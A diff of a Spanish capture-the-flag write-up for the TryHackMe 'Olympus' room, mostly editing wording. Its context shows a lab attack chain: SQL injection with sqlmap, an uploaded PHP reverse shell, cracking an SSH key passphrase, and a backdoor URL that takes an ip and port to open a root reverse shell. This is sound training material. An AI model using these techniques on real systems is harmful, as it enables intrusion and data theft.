@@ -13,16 +13,16 @@ Dentro música.
 
 > **Disclaimer:** algunos de estos primeros pasos que menciono a continuación son opcionales y solo reflejan mi modo de trabajar. Cada uno debería aplicar el propio.
 
-Lo primero es conectar nuestra máquina local con THM via VPN para poder atacar desde nuestro equipo a la máquina del room
+Lo primero es conectar nuestra máquina local con THM via VPN para poder atacar desde nuestro equipo a la máquina del room.
 
 ```console
 ┌──(ewan67㉿kali)-[~]
 └─$ sudo openvpn /home/ewan67/VPN_certs/THM_ewan67.ovpn
 ```
 
-A continuación iniciamos la máquina dando al botón&nbsp;&nbsp;<code class="language-plaintext highlighter-rouge" style="background-color:#73c686;color:#fff;">Start Machine</code>
+Iniciamos la máquina remota dando al botón&nbsp;&nbsp;<code class="language-plaintext highlighter-rouge" style="background-color:#73c686;color:#fff;">Start Machine</code>
 
-Abrimos otro terminal en local, creamos la carpeta de trabajo, nos posicionamos en ella y creamos un fichero de notas en el que iremos apuntando información relevante a lo largo del proceso. En mi caso ...
+Abrimos otro terminal en local, creamos la carpeta de trabajo, nos posicionamos en ella y creamos un fichero de notas en el que iremos apuntando información relevante a lo largo del proceso. En mi caso:
 
 ```console
 ┌──(ewan67㉿kali)-[~]
@@ -45,7 +45,7 @@ Abrimos otro terminal en local, creamos la carpeta de trabajo, nos posicionamos 
 Notas Olympus
 ```
 
-Con la conexión VPN establecida y la máquina remota iniciada, copiamos las IPs que aparecen en la página de THM correspondientes a nuestro equipo y al server remoto. Esto lo hago por costumbre para no tener que estar escribiéndolas cada vez que necesite utilizarlas en algun comando. En mi caso ...
+Con la conexión VPN establecida y la máquina remota iniciada, copiamos las IPs que aparecen en la página de THM correspondientes a nuestro equipo y al server remoto. Esto lo hago por costumbre para no tener que estar escribiéndolas cada vez que necesite utilizarlas en algun comando. En mi caso:
 
 ```console
 ┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
@@ -75,7 +75,7 @@ Abrimos el fichero con la salida de **nmap** en nuestro editor preferido y le ec
 
 * que corre un Ubuntu.
 
-* que en el puerto 80 hay un Apache/2.4.41 (Ubuntu) escuchando con una redirección 302 contra <em>http://olympus.thm</em>
+* que en el puerto 80 hay un Apache/2.4.41 (Ubuntu) escuchando con una redirección 302 contra *http://olympus.thm*
 
 Probamos a cargar en el navegador la IP del server ...
 
@@ -93,14 +93,14 @@ Volvemos a probar desde el navegador ...
 
 OK. Empezamos aplicando el procedimiento estandar de reconocimiento manual cuando nos enfrentamos a un sitio web, a saber:
 
-* echamos un ojo a lo que nos muestra, seguimos enlaces, analizamos URLs, probamos funcionalidades, completamos formularios, lanzamos búsquedas de existir la posibilidad, etc, etc; en resumen: trasteamos con él a ver qué nos dice. En nuestro caso no hay mucho donde rascar, pero la index incluye un mensaje que nos vale como primera pista:
+* echamos un ojo a lo que nos muestra, seguimos enlaces, analizamos URLs, probamos funcionalidades, completamos formularios, lanzamos búsquedas, etc, etc; en resumen: trasteamos con él a ver qué nos dice. En nuestro caso no hay mucho donde rascar, pero la index incluye un mensaje que nos vale como primera pista:
 > The old version of the website is still accessible on this domain.
 
-* echamos un ojo al código fuente en busca de comentarios, formularios, nombre del framework si lo hubiese, ficheros *.js* con contenido interesante como llamadas asíncronas, estructura de directorios a partir de los links, etc, etc.
+* echamos un ojo al código fuente en busca de comentarios, formularios, nombre del framework, ficheros *.js* con contenido interesante como llamadas asíncronas, estructura de directorios a partir de los links, etc, etc.
 
 * apuntamos todo lo que nos parezca relevante en nuestro fichero de bitácora *notas*.
 
-Tras el reconocimiento manual, toca utilizar la artillería.
+Tras el reconocimiento manual, la artillería.
 
 Para escanear el server tenemos varias herramientas a nuestra disposición: dirb, dirbuster, gobaster, nikto y un largo etc. En este caso vamos a utilizar dos de mis tools preferidas: **ffuf** y **feroxbuster**, ambas disponibles en el repositorio de Kali.
 
@@ -158,7 +158,7 @@ static                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration:
 :: Progress: [4713/4713] :: Job [1/1] :: 1053 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
 ```
 
-Qué nos cuenta este fuzzeo ? ... un par de cosas interesantes, pero la que más, el último directorio de la lista. Tendrá relación con lo el mensaje de la index *"The old version of the website ..."* ?
+Qué nos cuenta el fuzzeo ? ... el último directorio de la lista no es habitual, tendrá relación con lo el mensaje de la index *"The old version of the website ..."* ?
 
 Vamos con **feroxbuster** ...
 
@@ -171,15 +171,16 @@ Significado de las flags:
 
 * `-u`&nbsp;: la URL que queremos escanear.
 * `-w`&nbsp;: la ubicación de nuestro fichero de wordlist.
-* `-e`&nbsp;: le pedimos que extraiga enlaces del cuerpo de la respuestay realice nuevas peticiones en función de los resultados.
+* `-e`&nbsp;: le pedimos que extraiga enlaces del cuerpo de la respuesta y realice nuevas peticiones en función de los resultados.
 * `-t`&nbsp;: nro de hilos concurrentes.
 * `-o`&nbsp;: nombre del fichero donde almacenaremos la salida.
 
 La velocidad y la cantidad de info que vuelca esta herramienta son una verdadera pasada, volviéndola una alternativa más que interesante a venerables clásicos del rock como dirb, gobuster y cía.
 
-Por temas de espacio copio solo las últimas lineas de la salida, pero vale mucho la pena que le echéis un ojo al fichero que nos ha generado.
+Echamos un ojo al fichero que nos ha generado.
 
 ```
+[...]
 301      GET        9l       28w      332c http://olympus.thm/~webmaster/admin/js/plugins => http://olympus.thm/~webmaster/admin/js/plugins/
 301      GET        9l       28w      332c http://olympus.thm/~webmaster/admin/js/tinymce => http://olympus.thm/~webmaster/admin/js/tinymce/
 [####################] - 42s    42708/42708   0s      found:129     errors:1189   
@@ -237,7 +238,7 @@ Qué info hemos conseguido ?
 
 * Pinchando en cualquiera del resto de opciones del menu superior nos carga la página <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">/category.php</code>&nbsp;&nbsp;pasando un parametro GET <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">?cat_id=1</code>&nbsp;&nbsp;... ya veremos que se puede rascar de aquí.
 
-* Si en el input del Search que aparece al final de la página metemos una sencilla comilla simple y le damos a la lupa conseguimos que nos devuelva un error de SQL y parte de la query en cuestión en la página <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">/search.php</code>&nbsp;. Menos da una piedra.
+* Si en el input del Search que aparece al final de la página metemos una sencilla comilla simple y le damos a buscar conseguimos que nos devuelva un error de SQL y parte de la query en cuestión en la página <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">/search.php</code>&nbsp;. Menos da una piedra.
 
 * Enviando el formulario de Login nos carga <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">/includes/login.php</code>&nbsp;&nbsp;... una página en blanco con algo de info en el códido fuente.
 
@@ -245,7 +246,7 @@ Visto lo visto sobre nuestro amigo Victor, a por un exploit de primero.
 
 ## Análisis de vulnerabilidades
 
-Empezamos buscando en nuestro equipos con
+Buscamos en nuestro equipo.
 
 ```console
 ┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
@@ -301,7 +302,7 @@ Una opción es seguir el método de edición de URL que nos propone el exploit, 
 
 ## Explotación
 
-Vamos a utilizar **sqlmap** para que se encargue de la SQLi. Para ello ejecutamos:
+Vamos con **sqlmap**.
 
 ```console
 ┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
@@ -355,7 +356,7 @@ Database: olympus
 [...]
 ```
 
-De un primer vistazo la tabla *flag* promete felicidad, así que vamos a por ella.
+De un primer vistazo la tabla *flag* promete felicidad, vamos a por ella.
 
 ```console
 ┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
@@ -380,7 +381,7 @@ Table: flag
 [...]
 ```
 
-Volcamos su contenido
+Volcamos su contenido:
 
 ```console
 ┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
@@ -487,7 +488,7 @@ Bien. El dump nos ofrece una conjunto de registros con mensajes y algunos datos 
 
 * El usuario *prometheus* ha atacheado un fichero con el nombre *"prometheus_password.txt"*, pero al intentar descargarlo de la *"upload folder"*, no ha podido. Al parecer el fichero ha sufrido algun tipo de *"modificación"*.
 
-* El usuario *zeus* le responde contándole que el *"IT guy"* ha implementado una función que modifica el nombre de los ficheros de manera aleatoria antes de almacenarlos con el objetivo de dificultar el acceso a posibles atacantes.
+* El usuario *zeus* le responde contándole que el *"IT guy"* ha implementado una función que modifica el nombre de los ficheros de manera aleatoria, antes de almacenarlos, con el objetivo de dificultar el acceso a posibles atacantes.
 
 * Un nombre de fichero *"47c3210d51761686f3af40a875eeaaea.txt"* aparece asociado al registro del envío de *"prometheus_password.txt"*
 
@@ -552,7 +553,7 @@ Probamos y accedemos al dashboard del CMS ...
 
 Toca trastear y ver lo que nos ofrece.
 
-Probamos con la web del chat y ...
+Probamos con la web del chat:
 
 ![](/assets/posts/20220804/img08.png)
 
@@ -620,7 +621,7 @@ Vale, sospechas confirmadas. Nuevas tareas:
 
 * Arrancar una escucha en local con **netcat**
 
-* Pedir el fichero al server
+* Pedir el fichero al server para forzar la conexión.
 
 Vamos a ello. Lo primero es localizar en nuestro Kali el fichero que necesitamos, copiarlo a nuestro directorio de trabajo y editarlo.
 
@@ -685,7 +686,7 @@ Significado de las flags:
 * `-n`&nbsp;: solo IP numéricas, no DNS.
 * `-p`&nbsp;: nro de puerto local.
 
-Cargamos la shell desde el navegador con
+Cargamos la shell desde el navegador con:
 
 ```
 http://chat.olympus.thm/uploads/99e7c69732975b95791508afdabc5057.php
@@ -751,7 +752,7 @@ I've now got a permanent access as a super user to the olympus.
 www-data@olympus:/home/zeus$ 
 ```
 
-OK, hemos conseguido la segunda flag y tenemos un mensaje de *Prometheus* a su colega *Zeus* poniendo a caldo al chico de IT y alardeando de disponer de un acceso permanente como super usuario al server.
+OK, hemos conseguido la segunda flag y un mensaje de *Prometheus* a su colega *Zeus* poniendo a caldo al chico de IT y alardeando de disponer de un acceso permanente como super usuario al server.
 
 Seguimos trasteando un poco a ver qué encontramos.
 
@@ -849,7 +850,7 @@ No manual entry for cputils
 www-data@olympus:/home/zeus$
 ```
 
-El nombre da a pensar que se trate de una utilidad para *copiar cosas*, por lo de *cp*, pero a saber. Habrá que salir de dudas.
+El nombre da a pensar que se trate de una utilidad para *copiar cosas*, por lo de *cp*, pero a saber. Hay que salir de dudas.
 
 ```console
 [...]
@@ -952,7 +953,7 @@ Significado de las flags:
 
 * `-i`&nbsp;: identity_file.
 
-Mal rollo, la clave tiene una passphrase que desconocemos :(
+Mal rollo, la clave tiene una passphrase que desconocemos.
 
 Tiramos de **ssh2john** (para transformar la clave al formato de John The Reaper) y del propio **john** para crakearla.
 
@@ -995,7 +996,7 @@ Last login: Sat Jul 16 07:52:39 2022
 zeus@olympus:~$ 
 ```
 
-Ahora viene la parte donde echamos mano de ese fichero que todos guardamos como oro en paño en nuestro ordenador con un listado de comandos "mágico". Tras varias pruebas con el mio, doy con esto:
+Ahora viene la parte donde echamos mano de ese fichero que todos guardamos como oro en paño en nuestro ordenador con un listado de comandos "mágicos". Tras varias pruebas con el mio, doy con esto:
 
 ```console
 [...]
@@ -1024,16 +1025,16 @@ zeus@olympus:~$ find / -type f -group zeus 2>/dev/null
 zeus@olympus:~$ 
 ```
 
-Un listado de los ficheros a los que tiene acceso el grupo de *zeus* en el que hay dos que nos llaman la atención.
+Un listado de los ficheros a los que tiene acceso el grupo *zeus* en el que hay dos que nos llaman la atención.
 
 ```
 /var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/index.html
 /var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php
 ```
 
-Prestar atención a que estos ficheros no cuelgan de <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">/var/www/olympus.thm/public_html/</code>&nbsp;&nbsp;sino de <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">/var/www/html/</code>&nbsp;&nbsp;con lo que deberemos acceder a ellos directamente por IP.
+Fijaros que estos ficheros no cuelgan de <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">/var/www/olympus.thm/public_html/</code>&nbsp;&nbsp;sino de <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">/var/www/html/</code>&nbsp;&nbsp;con lo que deberemos acceder a ellos directamente por IP.
 
-Cargamos en un navegador la URL
+Cargamos en un navegador la URL:
 
 ```
 http://10.10.129.191/0aB44fdS3eDnLkpsz3deGv8TttR4sc/index.html
@@ -1045,7 +1046,7 @@ Nada, ni tirando del código fuente. Probamos con la siguiente
 http://10.10.129.191/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php
 ```
 
-Y nos pinta esto
+Nos pinta esto:
 
 ![](/assets/posts/20220804/img09.png)
 
@@ -1057,7 +1058,7 @@ Echamos un veo al código fuente
 
 Lo espartano del código HTML nos da dos pistas:
 
-* El propio fichero es el target del formulario dado que no hay atributo *action*
+* El propio fichero es el target del formulario dado que no hay atributo *action* establecido.
 
 * Se envía directamente, sin ninguna función js que controle el contenido del input *"password"*, con lo que es probable que esa validación la haga el propio fichero en el lado servidor.
 
@@ -1117,9 +1118,9 @@ proc_close($proc);
 zeus@olympus:/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc$ 
 ```
 
-Analizamos el código del fichero y vemos que en la primer línea se define una variable *$pass* seguida de un bloque que la compara el contenido del input *"password"* del form.
+Analizamos el código del fichero y vemos que en la primer línea se define una variable *$pass*, seguida de un bloque que la compara con el contenido del input *"password"* del form.
 
-Volvemos al navegador, rellenamos el input con el valor de *$pass* y le damos al Enter. Nos aparece lo siguiente
+Volvemos al navegador, rellenamos el input con el valor de *$pass* y le damos al Enter. Nos aparece lo siguiente:
 
 ![](/assets/posts/20220804/img10.png)
 
@@ -1127,15 +1128,15 @@ Un mensaje con intrucciones para cargar una shell reversa que promete acceso com
 
 Seguimos las instrucciones del mensaje
 
-* Iniciamos un **netcat** escuchando en el puerto 4433
+* Iniciamos un **netcat** escuchando en el puerto 4433 en este caso.
 
-* Cargamos la URL con la info correcta
+* Cargamos la URL con la info necesaria.
 
 ```
 10.10.129.191/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php?ip=10.18.xx.xx&port=4433
 ```
 
-Nos vamos al terminal con el **nc**
+Nos vamos al terminal con el **nc** que hemos puesto a escuchar en el puerto 4433 y una vez conectados empezamos a trastear:
 
 ```console
 ┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
@@ -1222,7 +1223,7 @@ root@olympus:/root#
 
 Tenemos la tercer flag.
 
-Como parte del mensaje, nos cuentan que Prometheus ha dejado una cuarta flag escondida en algun sitio y nos recomiendan logarnos como root sobre ssh para poder buscarla mediante algun comando basado en regex. Por otra parte, el hint de esta última bandera podría estar en el directorio <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">/etc</code>&nbsp;.
+Como parte del mensaje con la flag, nos cuentan que Prometheus ha dejado una cuarta bandera escondida en algun sitio y nos recomiendan logarnos como root sobre ssh para poder buscarla mediante algun comando basado en regex. Por otra parte, el hint de esta última bandera os dice que podría estar en el directorio <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">/etc</code>&nbsp;.
 
 ```console
 [...]
@@ -1253,7 +1254,7 @@ Significado de las flags del comando grep:
 
 ## Final
 
-Enhorabuena a los que habéis llegado hasta aquí. Espero que os haya resultado de fenrayuda.
+Enhorabuena a los que habéis llegado hasta aquí. Espero que esta guía os haya resultado de ayuda.
 
 Sed buenos si no hay una opción mejor.
 
